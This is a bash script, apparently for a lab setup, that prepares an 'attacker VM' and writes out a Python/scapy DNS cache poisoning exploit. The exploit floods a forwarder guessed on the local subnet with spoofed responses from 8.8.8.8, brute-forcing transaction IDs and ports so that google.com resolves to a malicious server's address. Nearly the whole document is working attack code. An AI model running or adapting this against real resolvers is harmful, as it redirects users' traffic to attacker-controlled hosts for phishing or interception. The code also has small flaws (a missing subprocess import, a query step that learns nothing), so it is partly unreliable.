#!/bin/bash

# 攻撃者VMセットアップスクリプト
echo "Setting up attacker VM..."

# 現在のIPアドレスを取得
LOCAL_IP=$(ip route get 8.8.8.8 | grep -oP 'src \K\S+')
echo "Local IP: $LOCAL_IP"

# 必要なパッケージをインストール
sudo apt update
sudo apt install -y python3-pip python3-dev build-essential

# Python依存関係をインストール
pip3 install scapy

# 攻撃スクリプトをダウンロード・作成
cat > /home/ubuntu/exploit.py << 'EOF'
#!/usr/bin/env python3
import socket
import threading
import time
import random
from scapy.all import *

def get_network_config():
    """ネットワーク設定を動的に取得"""
    local_ip = None
    try:
        result = subprocess.run(['ip', 'route', 'get', '8.8.8.8'], 
                              capture_output=True, text=True)
        for line in result.stdout.split('\n'):
            if 'src' in line:
                local_ip = line.split('src')[1].split()[0]
                break
    except:
        pass
    
    if not local_ip:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
    
    # ネットワークから他のホストを推定
    network_base = '.'.join(local_ip.split('.')[:-1])
    return {
        'attacker_ip': local_ip,
        'forwarder_ip': f"{network_base}.2",  # 通常forwarderは.2
        'malicious_ip': f"{network_base}.5",  # 悪意のあるサーバーIP
        'network_base': network_base
    }

def generate_queries(target_domain="google.com"):
    """非キャッシュクエリを生成してポート/TXIDを推測"""
    config = get_network_config()
    
    print("Querying non-cached names...")
    for i in range(100):
        random_domain = f"test{random.randint(1000, 9999)}.example.com"
        query = IP(dst=config['forwarder_ip']) / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname=random_domain))
        send(query, verbose=0)
        time.sleep(0.01)

def poison_cache():
    """DNSキャッシュポイズニング攻撃を実行"""
    config = get_network_config()
    
    print("Generating spoofed packets...")
    target_domain = "google.com"
    
    sent_count = 0
    start_time = time.time()
    
    for txid in range(1, 65536):
        for src_port in range(1024, 65536, 100):
            # 偽装DNS応答を作成
            spoofed_response = (
                IP(src="8.8.8.8", dst=config['forwarder_ip']) /
                UDP(sport=53, dport=src_port) /
                DNS(
                    id=txid,
                    qr=1,  # Response
                    aa=1,  # Authoritative
                    rd=1,  # Recursion Desired
                    ra=1,  # Recursion Available
                    qd=DNSQR(qname=target_domain),
                    an=DNSRR(rrname=target_domain, rdata=config['malicious_ip'])
                )
            )
            
            send(spoofed_response, verbose=0)
            sent_count += 1
            
            if sent_count % 10000 == 0:
                elapsed = time.time() - start_time
                print(f"Sent {sent_count} packets in {elapsed:.2f} seconds")
            
            if sent_count > 3000000:  # 制限を設ける
                break
        
        if sent_count > 3000000:
            break
    
    elapsed = time.time() - start_time
    print(f"Poisoned: b'{target_domain}.' => {config['malicious_ip']}")
    print(f"sent {sent_count} responses in {elapsed:.3f} seconds")

def main():
    config = get_network_config()
    print(f"Attacker IP: {config['attacker_ip']}")
    print(f"Target forwarder: {config['forwarder_ip']}")
    print(f"Malicious server IP: {config['malicious_ip']}")
    
    # ステップ1: 非キャッシュクエリでポート/TXID範囲を推測
    generate_queries()
    
    time.sleep(2)
    
    # ステップ2: キャッシュポイズニング攻撃
    poison_cache()

if __name__ == "__main__":
    main()
EOF

chmod +x /home/ubuntu/exploit.py

echo "Attacker VM setup completed!"
echo "Run the exploit with: python3 /home/ubuntu/exploit.py"